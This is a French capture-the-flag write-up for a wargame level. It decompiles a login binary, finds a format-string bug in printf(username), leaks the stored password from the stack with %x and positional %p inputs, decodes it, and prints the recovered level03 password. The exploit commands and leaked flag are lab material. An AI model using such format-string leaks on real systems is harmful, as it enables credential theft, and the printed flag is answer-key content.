# LEVEL 02

## Analyse du code

### Code décompilé (Ghidra)

```c
undefined8 main(void)
{
  int iVar1;
  size_t sVar2;
  long lVar3;
  char *pcVar4;
  char local_118 [112];  // Buffer password input
  char local_a8 [48];    // Buffer pour le mot de passe du fichier
  char local_78 [100];   // Buffer username
  int local_14;
  FILE *local_10;
  
  // [...] Initialisation des buffers à zéro [...]
  
  // Ouverture et lecture du fichier de mot de passe
  local_10 = fopen("/home/users/level03/.pass","r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
    exit(1);
  }
  
  // Lecture de 41 bytes (0x29) depuis le fichier
  sVar2 = fread(local_a8,1,0x29,local_10);
  local_14 = (int)sVar2;
  sVar2 = strcspn(local_a8,"\n");
  local_a8[sVar2] = '\0';
  
  if (local_14 != 0x29) {
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
    exit(1);
  }
  fclose(local_10);
  
  // Interface de login
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  
  // Lecture du username
  printf("--[ Username: ");
  fgets(local_78,100,stdin);
  sVar2 = strcspn(local_78,"\n");
  local_78[sVar2] = '\0';
  
  // Lecture du password
  printf("--[ Password: ");
  fgets(local_118,100,stdin);
  sVar2 = strcspn(local_118,"\n");
  local_118[sVar2] = '\0';
  
  puts("*****************************************");
  
  // Vérification du mot de passe
  iVar1 = strncmp(local_a8,local_118,0x29);
  if (iVar1 == 0) {
    printf("Greetings, %s!\n",local_78);
    system("/bin/sh");
    return 0;
  }
  
  // VULNÉRABILITÉ : Format String !
  printf(local_78);  // Devrait être printf("%s", local_78)
  puts(" does not have access!");
  exit(1);
}
```

---

## Identification de la vulnérabilité

### Format String Vulnerability

**Ligne critique :**
```c
printf(local_78);
```

Au lieu de :
```c
printf("%s", local_78);
```

**Conséquence :** En entrant des format specifiers (`%x`, `%p`, `%s`, `%n`) dans le username, on peut :
- Lire la pile mémoire
- Accéder aux variables stockées sur la pile
- Écrire en mémoire (avec `%n`)

---

## Exploitation

### Étape 1 : Exploration de la pile avec `%x`

**Test initial :**
```bash
Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
Password: test
```

**Sortie :**
```
AAAA ffffe500 0 78 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 78252078 25207825 20782520 
78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 
252078 0 34376848 61733951 574e6758 6e475873 664b394d feff00 41414141 ...
```

### Étape 2 : Analyse des valeurs

| Position | Valeur | Signification |
|----------|--------|---------------|
| ... | `0` | Fin d'une variable |
| 22 | `34376848` | Début du mot de passe |
| 23 | `61733951` | Suite du mot de passe |
| 24 | `574e6758` | Suite du mot de passe |
| 25 | `6e475873` | Suite du mot de passe |
| 26 | `664b394d` | Suite du mot de passe |
| 27 | `feff00` | Fin de string |

**Observation :** Le mot de passe du fichier `.pass` est stocké sur la pile !

### Étape 3 : Optimisation avec `%p` (64 bits)

**Problème :** Sur un système 64 bits, `%x` ne lit que **4 bytes** au lieu de **8 bytes**.

**Solution :** Utiliser `%p` pour lire 8 bytes à la fois :

```bash
echo "%22\$p %23\$p %24\$p %25\$p %26\$p" | ./level02
```

**Sortie :**
```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

**Sortie clean :**
```
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
```

---

## Décodage du mot de passe

#### Avec CyberChef :

1. Input : `756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d`
2. Opération 1 : **"From Hex"** (delimiter: Space)
3. Opération 2 : **"Swap endianness"** (Word length: 8)
4. Résultat : Le mot de passe !

---

## Solution

### Mot de passe trouvé :

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
